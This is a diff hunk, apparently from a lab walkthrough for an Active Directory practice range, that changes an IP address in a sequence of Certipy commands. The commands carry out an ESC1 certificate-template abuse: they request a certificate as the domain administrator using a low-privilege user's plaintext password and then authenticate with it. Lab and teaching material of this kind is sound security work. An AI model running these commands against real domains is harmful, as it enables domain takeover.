@@ -235,4 +235,4 @@ certipy find -u khal.drogo@essos.local -p 'horse' -dc-ip 192.168.3.12
 
 certipy req -u khal.drogo@essos.local -p 'horse' -target braavos.essos.local -template ESC1 -ca ESSOS-CA -upn administrator@essos.local
 
-certipy auth -pfx administrator.pfx -dc-ip 192.168.56.12
+certipy auth -pfx administrator.pfx -dc-ip 192.168.3.12
